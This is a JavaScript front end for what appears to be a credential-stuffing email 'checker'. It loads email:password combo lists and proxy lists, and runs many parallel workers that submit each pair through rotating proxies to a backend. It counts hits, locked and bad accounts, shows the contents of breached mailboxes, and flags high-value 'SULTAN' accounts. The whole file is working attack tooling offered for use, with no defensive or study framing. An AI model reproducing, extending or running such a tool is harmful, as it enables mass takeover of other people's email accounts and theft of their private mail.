let isRunning = false;
let combos = [];
let proxies = [];
let stats = { checked: 0, hit: 0, bad: 0, locked: 0 };
let currentIdx = 0;
let startTime;

document.getElementById('thread-range').oninput = function() {
    document.getElementById('thread-val').innerText = this.value;
};

// SMART PROXY LOADER
document.getElementById('file-proxies').onchange = (e) => {
    const reader = new FileReader();
    reader.onload = ev => {
        // Gabungkan baris yang terputus (menghapus enter di tengah link proxy)
        let raw = ev.target.result.replace(/\r?\n|\r/g, " "); 
        // Pisahkan kembali berdasarkan "http" untuk mendapatkan list proxy utuh
        proxies = raw.split("http").filter(p => p.trim() !== "").map(p => "http" + p.trim());
        
        document.getElementById('label-proxies').innerText = `${proxies.length} Proxies Fixed & Loaded`;
        console.log("Sample Proxy:", proxies[0]); // Cek di F12 browser
    };
    reader.readAsText(e.target.files[0]);
};

document.getElementById('file-combos').onchange = (e) => {
    const reader = new FileReader();
    reader.onload = ev => {
        combos = ev.target.result.split('\n').filter(l => l.includes(':'));
        document.getElementById('label-combos').innerText = `${combos.length} Loaded`;
    };
    reader.readAsText(e.target.files[0]);
};

async function worker() {
    while (isRunning && currentIdx < combos.length) {
        const id = currentIdx++;
        const combo = combos[id].trim();
        const proxy = proxies.length > 0 ? proxies[id % proxies.length] : null;

        try {
            const res = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ combo, proxy })
            });
            const data = await res.json();
            stats.checked++;
            if (data.status === 'HIT') { stats.hit++; addRow(data); }
            else if (data.status === 'LOCKED') { stats.locked++; }
            else { stats.bad++; }
            updateStats();
        } catch (e) { stats.bad++; updateStats(); }
    }
}

async function startChecking() {
    if (combos.length === 0) return alert("Load combo!");
    isRunning = true;
    currentIdx = 0;
    startTime = Date.now();
    document.getElementById('start-btn').disabled = true;
    document.getElementById('stop-btn').disabled = false;
    document.getElementById('res-table').innerHTML = "";

    const threadCount = parseInt(document.getElementById('thread-range').value);
    const workers = [];
    for (let i = 0; i < threadCount; i++) workers.push(worker());
    await Promise.all(workers);
    isRunning = false;
    document.getElementById('start-btn').disabled = false;
}

function updateStats() {
    document.getElementById('s-checked').innerText = stats.checked;
    document.getElementById('s-hit').innerText = stats.hit;
    document.getElementById('s-bad').innerText = stats.bad;
    document.getElementById('s-locked').innerText = stats.locked;
    const elapsed = (Date.now() - startTime) / 60000;
    document.getElementById('cpm-display').innerText = `CPM: ${elapsed > 0 ? Math.floor(stats.checked / elapsed) : 0}`;
}

function addRow(data) {
    const row = document.createElement('tr');
    const badge = data.isSultan ? `<span class="badge-sultan">⭐ SULTAN</span>` : `<span style="color:#3fb950;font-weight:bold">HIT</span>`;
    const mId = `m_${Math.random().toString(36).substr(2, 9)}`;
    window[mId] = data.body;
    row.innerHTML = `<td>${data.combo.split(':')[0]}</td><td>${badge}</td><td>${data.count} Mails</td><td><button onclick="viewMail('${mId}')" class="btn-primary" style="padding:4px 8px;font-size:10px">VIEW</button></td>`;
    document.getElementById('res-table').prepend(row);
}

function viewMail(id) {
    document.getElementById('mail-body').innerText = window[id];
    document.getElementById('emailModal').style.display = "block";
}

function closeModal() { document.getElementById('emailModal').style.display = "none"; }
document.getElementById('start-btn').onclick = startChecking;
document.getElementById('stop-btn').onclick = () => { isRunning = false; };
